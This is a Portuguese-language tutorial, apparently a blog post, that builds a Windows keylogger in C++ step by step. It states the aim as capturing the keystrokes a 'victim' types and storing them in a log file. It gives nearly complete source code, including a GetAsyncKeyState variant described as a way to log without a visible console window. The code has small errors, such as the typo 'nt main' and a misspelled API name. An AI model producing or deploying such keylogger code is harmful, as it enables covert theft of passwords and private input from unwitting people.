**Start Building**

Primeiro precisamos saber, o que temos que fazer? A resposta é um pouco óbvia: Precisamos capturar as teclas 
digitadas pela vítima no teclado e, em seguida, armazená-las em um arquivo de texto ou de log para processar posteriormente.

Então, vamos na nossa IDE, começamos apagando o default e colocando as bibliotecas que vamos utilizar:


```
#include <windows.h> 
#include <iostream> 
#include <fstream> 
#include <conio.h>

using namespace std;
```

Porque vamos essas bibliotecas?



1. A biblioteca **`windows.h`** contém declarações para todas as funções da API do Windows, todos os macros comuns utilizados pelos programadores do Windows, e todos os tipos de dados utilizados pelas várias funções e subsistemas. Ela possibilita você a fazer coisas como: Criar janelas e botões, enumerar arquivos de um diretório, consultar informações sobre o sistema(eg processos, serviços, janelas) e etc.
2. A biblioteca padrão de entrada e saída do C++ é a **`iostream`**. Ela deverá ser incluída no início de todo código em C++, porém, para maratonas, o ideal é que se use cabeçalho que inclui todas as bibliotecas padrões do C++ e também do C: bits/stdc++.h Apesar disso, busque saber quais bibliotecas seu programa realmente irá usar.
3. A biblioteca **`fstream`** é a biblioteca padrão para entrada e saída de dados em C++(este conjuga os dois tipos anteriores, “input and output to file”. cria ficheiros (arquivos), escreve e lê informação dos mesmos.
4. E por fim a necessária para que possamos manipular strings, **`conio. h`** que é um uma biblioteca(arquivo cabeçalho) de C usado principalmente por compiladores MS-DOS para fornecer input / output console, as funções do conio são úteis para manipular caracteres na tela, especificar cor de carácter e de fundo.

Então aqui incluímos todas as bibliotecas importantes, agora vamos declarar a função que irá armazenar todas as teclas digitadas:


```
int keys(char key, fstream&);
```

Agora vamos iniciar a função main:



```
nt main(){

  char key_press;
  int ascii_value;

  fstream afile;

  afile.open("key_file.txt", ios::in | ios::out);
  afile.close();

  while(true){

    /* Block 1 Starts */
    key_press = getch();
    ascii_value = key_press;
    cout << "Here --> " << key_press << endl;
    // cout << "Async --> " << ascii_value << endl;
    if(7 < ascii_value && ascii_value < 256){
      keys(key_press, afile);
    }
    /* Block 1 Ends */


    /* Block 2 Starts */

    // for(int i=8; i<256; i++){
    //   if(GetAsyncKeyState(i) == -32767){
    //     keys(i, afile);
    //   }
    // }

    /* Block 2 Ends */
  }
  return 0;
}
```

Aqui usamos `getch()` para capturar as teclas digitadas. Isso permitirá que a janela do console apareça e capture todas as teclas pressionadas e mostre-as como saída. Mas se você não quiser que esta janela do console apareça e apenas armazene as teclas digitadas diretamente no arquivo, isso é possível usando o método `GetAysncKeyState()`.

`GetAysncKeyState()` (Method Windows) determina se uma tecla está ativa ou inativa no momento em que a função é chamada e se a tecla foi pressionada após uma chamada anterior para `GetAysncKeyState`.

Agora definiremos o método de teclas para armazenar todas as teclas capturadas em um texto ou podemos dizer um arquivo de log.

Portanto, este method `keys()` armazenará todas as chaves dentro do arquivo, incluindo as chaves especiais.


```
int keys(char key, fstream& file){

  file.open("key_file.txt", ios::app | ios::in | ios::out);
  if(file){
    if(GetAsyncKeyState(VK_SHIFT)){
      file << "[SHIFT]";
    }
    else if(GetAsyncKeyState(VK_ESCAPE)){
      file << "[ESCAPE]";
    }
    else if(GetAsyncKeyState(VK_RETURN)){
      file << "[ENTER]";
    }
    else if(GetAsyncKeyState(VK_CONTROL)){
      file << "[CONTROL]";
    }
    else if(GetAsyncKeyState(VK_MENU)){
      file << "[ALT]";
    }
    else if(GetAsyncKeyState(VK_DELETE)){
      file << "[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB)){
      file << "[TAB]";
    }
    else if(GetAsyncKeyState(VK_BACK)){
      file << "[BACKSPACE]";
    }
    else{
      file << key;
    }
  }

  file.close();

  return 0;
}

```

Portanto, neste método abrimos um arquivo usando um ponteiro de objeto de arquivo e então conforme a tecla pressionada, este código irá digitá-los dentro do arquivo e salvá-los em cada um e todas as chamadas da função principal.

Se uma tecla especial for pressionada (ou seja, Enter, Shift, Backspace), então este método digitará [Tecla especial] dentro do arquivo para saber que uma tecla especial foi pressionada enquanto o keylogger estava capturando as teclas digitadas.



